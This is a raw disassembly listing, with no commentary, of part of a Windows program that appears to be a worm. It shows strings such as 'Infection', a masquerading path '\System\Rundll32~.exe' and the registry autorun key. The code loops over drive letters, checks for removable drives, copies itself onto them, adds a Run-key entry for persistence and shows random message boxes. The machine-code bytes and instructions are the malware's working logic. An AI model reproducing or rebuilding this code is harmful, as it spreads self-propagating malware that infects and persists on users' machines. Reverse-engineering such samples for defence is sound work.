  40a85d:	00 00                	add    %al,(%eax)
  40a85f:	00 39                	add    %bh,(%ecx)
  40a861:	2e 31 31             	xor    %esi,%cs:(%ecx)
  40a864:	2e 32 30             	xor    %cs:(%eax),%dh
  40a867:	30 34 00             	xor    %dh,(%eax,%eax,1)
  40a86a:	00 00                	add    %al,(%eax)
  40a86c:	ff                   	(bad)
  40a86d:	ff                   	(bad)
  40a86e:	ff                   	(bad)
  40a86f:	ff 04 00             	incl   (%eax,%eax,1)
  40a872:	00 00                	add    %al,(%eax)
  40a874:	44                   	inc    %esp
  40a875:	61                   	popa
  40a876:	74 65                	je     0x40a8dd
  40a878:	00 00                	add    %al,(%eax)
  40a87a:	00 00                	add    %al,(%eax)
  40a87c:	ff                   	(bad)
  40a87d:	ff                   	(bad)
  40a87e:	ff                   	(bad)
  40a87f:	ff 09                	decl   (%ecx)
  40a881:	00 00                	add    %al,(%eax)
  40a883:	00 49 6e             	add    %cl,0x6e(%ecx)
  40a886:	66 65 63 74 69 6f    	arpl   %si,%gs:0x6f(%ecx,%ebp,2)
  40a88c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a88d:	00 00                	add    %al,(%eax)
  40a88f:	00 ff                	add    %bh,%bh
  40a891:	ff                   	(bad)
  40a892:	ff                   	(bad)
  40a893:	ff 2d 00 00 00 53    	ljmp   *0x53000000
  40a899:	6f                   	outsl  %ds:(%esi),(%dx)
  40a89a:	66 74 77             	data16 je 0x40a914
  40a89d:	61                   	popa
  40a89e:	72 65                	jb     0x40a905
  40a8a0:	5c                   	pop    %esp
  40a8a1:	4d                   	dec    %ebp
  40a8a2:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40a8a9:	74 5c                	je     0x40a907
  40a8ab:	57                   	push   %edi
  40a8ac:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  40a8b3:	43                   	inc    %ebx
  40a8b4:	75 72                	jne    0x40a928
  40a8b6:	72 65                	jb     0x40a91d
  40a8b8:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8b9:	74 56                	je     0x40a911
  40a8bb:	65 72 73             	gs jb  0x40a931
  40a8be:	69 6f 6e 5c 52 75 6e 	imul   $0x6e75525c,0x6e(%edi),%ebp
  40a8c5:	00 00                	add    %al,(%eax)
  40a8c7:	00 ff                	add    %bh,%bh
  40a8c9:	ff                   	(bad)
  40a8ca:	ff                   	(bad)
  40a8cb:	ff 15 00 00 00 5c    	call   *0x5c000000
  40a8d1:	53                   	push   %ebx
  40a8d2:	79 73                	jns    0x40a947
  40a8d4:	74 65                	je     0x40a93b
  40a8d6:	6d                   	insl   (%dx),%es:(%edi)
  40a8d7:	5c                   	pop    %esp
  40a8d8:	52                   	push   %edx
  40a8d9:	75 6e                	jne    0x40a949
  40a8db:	64 6c                	fs insb (%dx),%es:(%edi)
  40a8dd:	6c                   	insb   (%dx),%es:(%edi)
  40a8de:	33 32                	xor    (%edx),%esi
  40a8e0:	7e 2e                	jle    0x40a910
  40a8e2:	65 78 65             	gs js  0x40a94a
  40a8e5:	00 00                	add    %al,(%eax)
  40a8e7:	00 ff                	add    %bh,%bh
  40a8e9:	ff                   	(bad)
  40a8ea:	ff                   	(bad)
  40a8eb:	ff 05 00 00 00 20    	incl   0x20000000
  40a8f1:	2f                   	das
  40a8f2:	6f                   	outsl  %ds:(%esi),(%dx)
  40a8f3:	75 74                	jne    0x40a969
  40a8f5:	00 00                	add    %al,(%eax)
  40a8f7:	00 ff                	add    %bh,%bh
  40a8f9:	ff                   	(bad)
  40a8fa:	ff                   	(bad)
  40a8fb:	ff 08                	decl   (%eax)
  40a8fd:	00 00                	add    %al,(%eax)
  40a8ff:	00 52 75             	add    %dl,0x75(%edx)
  40a902:	6e                   	outsb  %ds:(%esi),(%dx)
  40a903:	64 6c                	fs insb (%dx),%es:(%edi)
  40a905:	6c                   	insb   (%dx),%es:(%edi)
  40a906:	33 32                	xor    (%edx),%esi
  40a908:	00 00                	add    %al,(%eax)
  40a90a:	00 00                	add    %al,(%eax)
  40a90c:	55                   	push   %ebp
  40a90d:	8b ec                	mov    %esp,%ebp
  40a90f:	33 c9                	xor    %ecx,%ecx
  40a911:	51                   	push   %ecx
  40a912:	51                   	push   %ecx
  40a913:	51                   	push   %ecx
  40a914:	51                   	push   %ecx
  40a915:	53                   	push   %ebx
  40a916:	56                   	push   %esi
  40a917:	57                   	push   %edi
  40a918:	33 c0                	xor    %eax,%eax
  40a91a:	55                   	push   %ebp
  40a91b:	68 d7 aa 40 00       	push   $0x40aad7
  40a920:	64 ff 30             	push   %fs:(%eax)
  40a923:	64 89 20             	mov    %esp,%fs:(%eax)
  40a926:	8d 55 f8             	lea    -0x8(%ebp),%edx
  40a929:	33 c0                	xor    %eax,%eax
  40a92b:	e8 44 7e ff ff       	call   0x402774
  40a930:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40a933:	8d 55 fc             	lea    -0x4(%ebp),%edx
  40a936:	e8 d5 a6 ff ff       	call   0x405010
  40a93b:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40a93e:	ba f0 aa 40 00       	mov    $0x40aaf0,%edx
  40a943:	e8 14 89 ff ff       	call   0x40325c
  40a948:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40a94b:	ba fc aa 40 00       	mov    $0x40aafc,%edx
  40a950:	e8 07 89 ff ff       	call   0x40325c
  40a955:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40a958:	ba f0 aa 40 00       	mov    $0x40aaf0,%edx
  40a95d:	e8 fa 88 ff ff       	call   0x40325c
  40a962:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40a965:	50                   	push   %eax
  40a966:	8d 55 f4             	lea    -0xc(%ebp),%edx
  40a969:	33 c0                	xor    %eax,%eax
  40a96b:	e8 04 7e ff ff       	call   0x402774
  40a970:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40a973:	8d 55 f8             	lea    -0x8(%ebp),%edx
  40a976:	e8 29 a7 ff ff       	call   0x4050a4
  40a97b:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40a97e:	58                   	pop    %eax
  40a97f:	e8 d8 88 ff ff       	call   0x40325c
  40a984:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a987:	e8 2c a5 ff ff       	call   0x404eb8
  40a98c:	3c 01                	cmp    $0x1,%al
  40a98e:	0f 85 28 01 00 00    	jne    0x40aabc
  40a994:	6a 01                	push   $0x1
  40a996:	6a 00                	push   $0x0
  40a998:	8d 55 fc             	lea    -0x4(%ebp),%edx
  40a99b:	b8 01 00 00 00       	mov    $0x1,%eax
  40a9a0:	e8 cf 7d ff ff       	call   0x402774
  40a9a5:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40a9a8:	ba 10 ab 40 00       	mov    $0x40ab10,%edx
  40a9ad:	e8 aa 88 ff ff       	call   0x40325c
  40a9b2:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40a9b5:	50                   	push   %eax
  40a9b6:	8d 55 f8             	lea    -0x8(%ebp),%edx
  40a9b9:	b8 02 00 00 00       	mov    $0x2,%eax
  40a9be:	e8 b1 7d ff ff       	call   0x402774
  40a9c3:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40a9c6:	58                   	pop    %eax
  40a9c7:	e8 90 88 ff ff       	call   0x40325c
  40a9cc:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40a9cf:	ba 10 ab 40 00       	mov    $0x40ab10,%edx
  40a9d4:	e8 83 88 ff ff       	call   0x40325c
  40a9d9:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40a9dc:	50                   	push   %eax
  40a9dd:	8d 55 f8             	lea    -0x8(%ebp),%edx
  40a9e0:	b8 03 00 00 00       	mov    $0x3,%eax
  40a9e5:	e8 8a 7d ff ff       	call   0x402774
  40a9ea:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40a9ed:	58                   	pop    %eax
  40a9ee:	e8 69 88 ff ff       	call   0x40325c
  40a9f3:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40a9f6:	ba 10 ab 40 00       	mov    $0x40ab10,%edx
  40a9fb:	e8 5c 88 ff ff       	call   0x40325c
  40aa00:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40aa03:	50                   	push   %eax
  40aa04:	8d 55 f8             	lea    -0x8(%ebp),%edx
  40aa07:	b8 04 00 00 00       	mov    $0x4,%eax
  40aa0c:	e8 63 7d ff ff       	call   0x402774
  40aa11:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40aa14:	58                   	pop    %eax
  40aa15:	e8 42 88 ff ff       	call   0x40325c
  40aa1a:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40aa1d:	ba 10 ab 40 00       	mov    $0x40ab10,%edx
  40aa22:	e8 35 88 ff ff       	call   0x40325c
  40aa27:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40aa2a:	50                   	push   %eax
  40aa2b:	8d 55 f8             	lea    -0x8(%ebp),%edx
  40aa2e:	b8 05 00 00 00       	mov    $0x5,%eax
  40aa33:	e8 3c 7d ff ff       	call   0x402774
  40aa38:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40aa3b:	58                   	pop    %eax
  40aa3c:	e8 1b 88 ff ff       	call   0x40325c
  40aa41:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40aa44:	e8 5b 89 ff ff       	call   0x4033a4
  40aa49:	50                   	push   %eax
  40aa4a:	8d 55 f4             	lea    -0xc(%ebp),%edx
  40aa4d:	33 c0                	xor    %eax,%eax
  40aa4f:	e8 20 7d ff ff       	call   0x402774
  40aa54:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40aa57:	8d 55 f8             	lea    -0x8(%ebp),%edx
  40aa5a:	e8 b1 a5 ff ff       	call   0x405010
  40aa5f:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40aa62:	ba f0 aa 40 00       	mov    $0x40aaf0,%edx
  40aa67:	e8 f0 87 ff ff       	call   0x40325c
  40aa6c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40aa6f:	ba fc aa 40 00       	mov    $0x40aafc,%edx
  40aa74:	e8 e3 87 ff ff       	call   0x40325c
  40aa79:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40aa7c:	ba f0 aa 40 00       	mov    $0x40aaf0,%edx
  40aa81:	e8 d6 87 ff ff       	call   0x40325c
  40aa86:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40aa89:	50                   	push   %eax
  40aa8a:	8d 55 f0             	lea    -0x10(%ebp),%edx
  40aa8d:	33 c0                	xor    %eax,%eax
  40aa8f:	e8 e0 7c ff ff       	call   0x402774
  40aa94:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40aa97:	8d 55 f4             	lea    -0xc(%ebp),%edx
  40aa9a:	e8 05 a6 ff ff       	call   0x4050a4
  40aa9f:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40aaa2:	58                   	pop    %eax
  40aaa3:	e8 b4 87 ff ff       	call   0x40325c
  40aaa8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40aaab:	e8 f4 88 ff ff       	call   0x4033a4
  40aab0:	50                   	push   %eax
  40aab1:	68 14 ab 40 00       	push   $0x40ab14
  40aab6:	53                   	push   %ebx
  40aab7:	e8 6c ed ff ff       	call   0x409828
  40aabc:	33 c0                	xor    %eax,%eax
  40aabe:	5a                   	pop    %edx
  40aabf:	59                   	pop    %ecx
  40aac0:	59                   	pop    %ecx
  40aac1:	64 89 10             	mov    %edx,%fs:(%eax)
  40aac4:	68 de aa 40 00       	push   $0x40aade
  40aac9:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40aacc:	ba 04 00 00 00       	mov    $0x4,%edx
  40aad1:	e8 2a 86 ff ff       	call   0x403100
  40aad6:	c3                   	ret
  40aad7:	e9 84 82 ff ff       	jmp    0x402d60
  40aadc:	eb eb                	jmp    0x40aac9
  40aade:	5f                   	pop    %edi
  40aadf:	5e                   	pop    %esi
  40aae0:	5b                   	pop    %ebx
  40aae1:	8b e5                	mov    %ebp,%esp
  40aae3:	5d                   	pop    %ebp
  40aae4:	c3                   	ret
  40aae5:	00 00                	add    %al,(%eax)
  40aae7:	00 ff                	add    %bh,%bh
  40aae9:	ff                   	(bad)
  40aaea:	ff                   	(bad)
  40aaeb:	ff 01                	incl   (%ecx)
  40aaed:	00 00                	add    %al,(%eax)
  40aaef:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  40aaf3:	00 ff                	add    %bh,%bh
  40aaf5:	ff                   	(bad)
  40aaf6:	ff                   	(bad)
  40aaf7:	ff 08                	decl   (%eax)
  40aaf9:	00 00                	add    %al,(%eax)
  40aafb:	00 4d 6f             	add    %cl,0x6f(%ebp)
  40aafe:	75 73                	jne    0x40ab73
  40ab00:	65 5f                	gs pop %edi
  40ab02:	4d                   	dec    %ebp
  40ab03:	58                   	pop    %eax
  40ab04:	00 00                	add    %al,(%eax)
  40ab06:	00 00                	add    %al,(%eax)
  40ab08:	ff                   	(bad)
  40ab09:	ff                   	(bad)
  40ab0a:	ff                   	(bad)
  40ab0b:	ff 01                	incl   (%ecx)
  40ab0d:	00 00                	add    %al,(%eax)
  40ab0f:	00 20                	add    %ah,(%eax)
  40ab11:	00 00                	add    %al,(%eax)
  40ab13:	00 6f 70             	add    %ch,0x70(%edi)
  40ab16:	65 6e                	outsb  %gs:(%esi),(%dx)
  40ab18:	00 00                	add    %al,(%eax)
  40ab1a:	00 00                	add    %al,(%eax)
  40ab1c:	55                   	push   %ebp
  40ab1d:	8b ec                	mov    %esp,%ebp
  40ab1f:	83 c4 ec             	add    $0xffffffec,%esp
  40ab22:	53                   	push   %ebx
  40ab23:	56                   	push   %esi
  40ab24:	57                   	push   %edi
  40ab25:	33 c0                	xor    %eax,%eax
  40ab27:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40ab2a:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40ab2d:	e8 0e 85 ff ff       	call   0x403040
  40ab32:	e8 c1 99 ff ff       	call   0x4044f8
  40ab37:	e8 78 c9 ff ff       	call   0x4074b4
  40ab3c:	e8 27 e7 ff ff       	call   0x409268
  40ab41:	bb 60 c5 40 00       	mov    $0x40c560,%ebx
  40ab46:	33 c0                	xor    %eax,%eax
  40ab48:	55                   	push   %ebp
  40ab49:	68 3a af 40 00       	push   $0x40af3a
  40ab4e:	64 ff 30             	push   %fs:(%eax)
  40ab51:	64 89 20             	mov    %esp,%fs:(%eax)
  40ab54:	e8 73 7c ff ff       	call   0x4027cc
  40ab59:	c6 05 64 c6 40 00 00 	movb   $0x0,0x40c664
  40ab60:	8d 55 ec             	lea    -0x14(%ebp),%edx
  40ab63:	b8 01 00 00 00       	mov    $0x1,%eax
  40ab68:	e8 07 7c ff ff       	call   0x402774
  40ab6d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40ab70:	8d 55 f0             	lea    -0x10(%ebp),%edx
  40ab73:	e8 ec ec ff ff       	call   0x409864
  40ab78:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40ab7b:	ba 58 af 40 00       	mov    $0x40af58,%edx
  40ab80:	e8 6b 87 ff ff       	call   0x4032f0
  40ab85:	75 14                	jne    0x40ab9b
  40ab87:	b8 1e 00 00 00       	mov    $0x1e,%eax
  40ab8c:	e8 b3 7c ff ff       	call   0x402844
  40ab91:	48                   	dec    %eax
  40ab92:	75 07                	jne    0x40ab9b
  40ab94:	c6 05 64 c6 40 00 01 	movb   $0x1,0x40c664
  40ab9b:	68 00 01 00 00       	push   $0x100
  40aba0:	68 64 c5 40 00       	push   $0x40c564
  40aba5:	e8 c2 9a ff ff       	call   0x40466c
  40abaa:	6a 00                	push   $0x0
  40abac:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40abaf:	ba 64 c5 40 00       	mov    $0x40c564,%edx
  40abb4:	b9 00 01 00 00       	mov    $0x100,%ecx
  40abb9:	e8 7e 86 ff ff       	call   0x40323c
  40abbe:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40abc1:	ba 68 af 40 00       	mov    $0x40af68,%edx
  40abc6:	e8 91 86 ff ff       	call   0x40325c
  40abcb:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40abce:	e8 d1 87 ff ff       	call   0x4033a4
  40abd3:	50                   	push   %eax
  40abd4:	8d 55 ec             	lea    -0x14(%ebp),%edx
  40abd7:	33 c0                	xor    %eax,%eax
  40abd9:	e8 96 7b ff ff       	call   0x402774
  40abde:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40abe1:	e8 be 87 ff ff       	call   0x4033a4
  40abe6:	50                   	push   %eax
  40abe7:	e8 00 9a ff ff       	call   0x4045ec
  40abec:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40abef:	ba 64 c5 40 00       	mov    $0x40c564,%edx
  40abf4:	b9 00 01 00 00       	mov    $0x100,%ecx
  40abf9:	e8 3e 86 ff ff       	call   0x40323c
  40abfe:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40ac01:	ba 68 af 40 00       	mov    $0x40af68,%edx
  40ac06:	e8 51 86 ff ff       	call   0x40325c
  40ac0b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40ac0e:	ba 20 00 00 00       	mov    $0x20,%edx
  40ac13:	e8 b0 a2 ff ff       	call   0x404ec8
  40ac18:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40ac1b:	ba 64 c5 40 00       	mov    $0x40c564,%edx
  40ac20:	b9 00 01 00 00       	mov    $0x100,%ecx
  40ac25:	e8 12 86 ff ff       	call   0x40323c
  40ac2a:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40ac2d:	ba 68 af 40 00       	mov    $0x40af68,%edx
  40ac32:	e8 25 86 ff ff       	call   0x40325c
  40ac37:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40ac3a:	b8 70 c6 40 00       	mov    $0x40c670,%eax
  40ac3f:	e8 45 90 ff ff       	call   0x403c89
  40ac44:	ba 00 ee 00 00       	mov    $0xee00,%edx
  40ac49:	b8 70 c6 40 00       	mov    $0x40c670,%eax
  40ac4e:	e8 7d 93 ff ff       	call   0x403fd0
  40ac53:	ba 01 00 00 00       	mov    $0x1,%edx
  40ac58:	b8 70 c6 40 00       	mov    $0x40c670,%eax
  40ac5d:	e8 a2 93 ff ff       	call   0x404004
  40ac62:	b8 70 c6 40 00       	mov    $0x40c670,%eax
  40ac67:	e8 cc 93 ff ff       	call   0x404038
  40ac6c:	b8 70 c6 40 00       	mov    $0x40c670,%eax
  40ac71:	e8 b6 90 ff ff       	call   0x403d2c
  40ac76:	e8 15 7a ff ff       	call   0x402690
  40ac7b:	85 c0                	test   %eax,%eax
  40ac7d:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40ac80:	ba 64 c5 40 00       	mov    $0x40c564,%edx
  40ac85:	b9 00 01 00 00       	mov    $0x100,%ecx
  40ac8a:	e8 ad 85 ff ff       	call   0x40323c
  40ac8f:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40ac92:	ba 68 af 40 00       	mov    $0x40af68,%edx
  40ac97:	e8 c0 85 ff ff       	call   0x40325c
  40ac9c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40ac9f:	ba 23 00 00 00       	mov    $0x23,%edx
  40aca4:	e8 1f a2 ff ff       	call   0x404ec8
  40aca9:	e8 7a f9 ff ff       	call   0x40a628
  40acae:	8d 55 ec             	lea    -0x14(%ebp),%edx
  40acb1:	b8 01 00 00 00       	mov    $0x1,%eax
  40acb6:	e8 b9 7a ff ff       	call   0x402774
  40acbb:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40acbe:	8d 55 f0             	lea    -0x10(%ebp),%edx
  40acc1:	e8 9e eb ff ff       	call   0x409864
  40acc6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40acc9:	ba 58 af 40 00       	mov    $0x40af58,%edx
  40acce:	e8 1d 86 ff ff       	call   0x4032f0
  40acd3:	75 05                	jne    0x40acda
  40acd5:	e8 86 f0 ff ff       	call   0x409d60
  40acda:	c6 03 61             	movb   $0x61,(%ebx)
  40acdd:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40ace0:	8a 13                	mov    (%ebx),%dl
  40ace2:	e8 09 85 ff ff       	call   0x4031f0
  40ace7:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40acea:	ba 88 af 40 00       	mov    $0x40af88,%edx
  40acef:	e8 68 85 ff ff       	call   0x40325c
  40acf4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40acf7:	e8 a8 86 ff ff       	call   0x4033a4
  40acfc:	50                   	push   %eax
  40acfd:	e8 32 99 ff ff       	call   0x404634
  40ad02:	83 f8 02             	cmp    $0x2,%eax
  40ad05:	0f 84 0a 01 00 00    	je     0x40ae15
  40ad0b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40ad0e:	8a 13                	mov    (%ebx),%dl
  40ad10:	e8 db 84 ff ff       	call   0x4031f0
  40ad15:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40ad18:	ba 88 af 40 00       	mov    $0x40af88,%edx
  40ad1d:	e8 3a 85 ff ff       	call   0x40325c
  40ad22:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40ad25:	e8 7a 86 ff ff       	call   0x4033a4
  40ad2a:	50                   	push   %eax
  40ad2b:	e8 04 99 ff ff       	call   0x404634
  40ad30:	85 c0                	test   %eax,%eax
  40ad32:	0f 84 dd 00 00 00    	je     0x40ae15
  40ad38:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40ad3b:	8a 13                	mov    (%ebx),%dl
  40ad3d:	e8 ae 84 ff ff       	call   0x4031f0
  40ad42:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40ad45:	ba 88 af 40 00       	mov    $0x40af88,%edx
  40ad4a:	e8 0d 85 ff ff       	call   0x40325c
  40ad4f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40ad52:	e8 4d 86 ff ff       	call   0x4033a4
  40ad57:	50                   	push   %eax
  40ad58:	e8 d7 98 ff ff       	call   0x404634
  40ad5d:	48                   	dec    %eax
  40ad5e:	0f 84 b1 00 00 00    	je     0x40ae15
  40ad64:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40ad67:	8a 13                	mov    (%ebx),%dl
  40ad69:	e8 82 84 ff ff       	call   0x4031f0
  40ad6e:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40ad71:	ba 88 af 40 00       	mov    $0x40af88,%edx
  40ad76:	e8 e1 84 ff ff       	call   0x40325c
  40ad7b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40ad7e:	e8 21 86 ff ff       	call   0x4033a4
  40ad83:	50                   	push   %eax
  40ad84:	e8 ab 98 ff ff       	call   0x404634
  40ad89:	83 f8 05             	cmp    $0x5,%eax
  40ad8c:	0f 84 83 00 00 00    	je     0x40ae15
  40ad92:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40ad95:	8a 13                	mov    (%ebx),%dl
  40ad97:	e8 54 84 ff ff       	call   0x4031f0
  40ad9c:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40ad9f:	ba 88 af 40 00       	mov    $0x40af88,%edx
  40ada4:	e8 b3 84 ff ff       	call   0x40325c
  40ada9:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40adac:	ba 94 af 40 00       	mov    $0x40af94,%edx
  40adb1:	e8 a6 84 ff ff       	call   0x40325c
  40adb6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40adb9:	e8 ea 78 ff ff       	call   0x4026a8
  40adbe:	e8 cd 78 ff ff       	call   0x402690
  40adc3:	85 c0                	test   %eax,%eax
  40adc5:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40adc8:	8a 13                	mov    (%ebx),%dl
  40adca:	e8 21 84 ff ff       	call   0x4031f0
  40adcf:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40add2:	ba 88 af 40 00       	mov    $0x40af88,%edx
  40add7:	e8 80 84 ff ff       	call   0x40325c
  40addc:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40addf:	ba 94 af 40 00       	mov    $0x40af94,%edx
  40ade4:	e8 73 84 ff ff       	call   0x40325c
  40ade9:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40adec:	ba 12 00 00 00       	mov    $0x12,%edx
  40adf1:	e8 d2 a0 ff ff       	call   0x404ec8
  40adf6:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40adf9:	8a 13                	mov    (%ebx),%dl
  40adfb:	e8 f0 83 ff ff       	call   0x4031f0
  40ae00:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40ae03:	ba 88 af 40 00       	mov    $0x40af88,%edx
  40ae08:	e8 4f 84 ff ff       	call   0x40325c
  40ae0d:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40ae10:	e8 5f f1 ff ff       	call   0x409f74
  40ae15:	fe 03                	incb   (%ebx)
  40ae17:	80 3b 7b             	cmpb   $0x7b,(%ebx)
  40ae1a:	0f 85 bd fe ff ff    	jne    0x40acdd
  40ae20:	e8 e7 fa ff ff       	call   0x40a90c
  40ae25:	b8 0a 00 00 00       	mov    $0xa,%eax
  40ae2a:	e8 15 7a ff ff       	call   0x402844
  40ae2f:	48                   	dec    %eax
  40ae30:	0f 85 b0 00 00 00    	jne    0x40aee6
  40ae36:	80 3d 64 c6 40 00 01 	cmpb   $0x1,0x40c664
  40ae3d:	0f 85 a3 00 00 00    	jne    0x40aee6
  40ae43:	b8 c0 d4 01 00       	mov    $0x1d4c0,%eax
  40ae48:	e8 f7 79 ff ff       	call   0x402844
  40ae4d:	05 60 ea 00 00       	add    $0xea60,%eax
  40ae52:	50                   	push   %eax
  40ae53:	e8 3c 98 ff ff       	call   0x404694
  40ae58:	b8 06 00 00 00       	mov    $0x6,%eax
  40ae5d:	e8 e2 79 ff ff       	call   0x402844
  40ae62:	83 f8 05             	cmp    $0x5,%eax
  40ae65:	77 1f                	ja     0x40ae86
  40ae67:	ff 24 85 6e ae 40 00 	jmp    *0x40ae6e(,%eax,4)
  40ae6e:	86 ae 40 00 86 ae    	xchg   %ch,-0x5179ffc0(%esi)
  40ae74:	40                   	inc    %eax
  40ae75:	00 86 ae 40 00 86    	add    %al,-0x79ffbf52(%esi)
  40ae7b:	ae                   	scas   %es:(%edi),%al
  40ae7c:	40                   	inc    %eax
  40ae7d:	00 86 ae 40 00 86    	add    %al,-0x79ffbf52(%esi)
  40ae83:	ae                   	scas   %es:(%edi),%al
  40ae84:	40                   	inc    %eax
  40ae85:	00 b8 03 00 00 00    	add    %bh,0x3(%eax)
  40ae8b:	e8 b4 79 ff ff       	call   0x402844
  40ae90:	83 e8 01             	sub    $0x1,%eax
  40ae93:	72 07                	jb     0x40ae9c
  40ae95:	74 16                	je     0x40aead
  40ae97:	48                   	dec    %eax
  40ae98:	74 24                	je     0x40aebe
  40ae9a:	eb 31                	jmp    0x40aecd
  40ae9c:	b8 68 c6 40 00       	mov    $0x40c668,%eax
  40aea1:	ba a8 af 40 00       	mov    $0x40afa8,%edx
  40aea6:	e8 85 82 ff ff       	call   0x403130
  40aeab:	eb 20                	jmp    0x40aecd
  40aead:	b8 68 c6 40 00       	mov    $0x40c668,%eax
  40aeb2:	ba b8 af 40 00       	mov    $0x40afb8,%edx
  40aeb7:	e8 74 82 ff ff       	call   0x403130
  40aebc:	eb 0f                	jmp    0x40aecd
  40aebe:	b8 68 c6 40 00       	mov    $0x40c668,%eax
  40aec3:	ba d0 af 40 00       	mov    $0x40afd0,%edx
  40aec8:	e8 63 82 ff ff       	call   0x403130
  40aecd:	6a 30                	push   $0x30
  40aecf:	a1 68 c6 40 00       	mov    0x40c668,%eax
  40aed4:	e8 cb 84 ff ff       	call   0x4033a4
  40aed9:	50                   	push   %eax
  40aeda:	68 64 c5 40 00       	push   $0x40c564
  40aedf:	6a 00                	push   $0x0
  40aee1:	e8 c6 97 ff ff       	call   0x4046ac
  40aee6:	8d 55 ec             	lea    -0x14(%ebp),%edx
  40aee9:	b8 01 00 00 00       	mov    $0x1,%eax
  40aeee:	e8 81 78 ff ff       	call   0x402774
  40aef3:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40aef6:	8d 55 f0             	lea    -0x10(%ebp),%edx
  40aef9:	e8 66 e9 ff ff       	call   0x409864
  40aefe:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40af01:	ba 58 af 40 00       	mov    $0x40af58,%edx
  40af06:	e8 e5 83 ff ff       	call   0x4032f0
  40af0b:	75 12                	jne    0x40af1f
  40af0d:	c6 03 61             	movb   $0x61,(%ebx)
  40af10:	68 80 4f 12 00       	push   $0x124f80
  40af15:	e8 7a 97 ff ff       	call   0x404694
  40af1a:	80 3b 62             	cmpb   $0x62,(%ebx)
  40af1d:	75 f1                	jne    0x40af10
  40af1f:	33 c0                	xor    %eax,%eax
  40af21:	5a                   	pop    %edx
  40af22:	59                   	pop    %ecx
  40af23:	59                   	pop    %ecx
  40af24:	64 89 10             	mov    %edx,%fs:(%eax)
  40af27:	68 41 af 40 00       	push   $0x40af41
  40af2c:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40af2f:	ba 02 00 00 00       	mov    $0x2,%edx
  40af34:	e8 c7 81 ff ff       	call   0x403100
  40af39:	c3                   	ret
  40af3a:	e9 21 7e ff ff       	jmp    0x402d60
  40af3f:	eb eb                	jmp    0x40af2c
  40af41:	5f                   	pop    %edi
  40af42:	5e                   	pop    %esi
  40af43:	5b                   	pop    %ebx
  40af44:	e8 42 8f ff ff       	call   0x403e8b
  40af49:	8b e5                	mov    %ebp,%esp
  40af4b:	5d                   	pop    %ebp
  40af4c:	c3                   	ret
  40af4d:	00 00                	add    %al,(%eax)
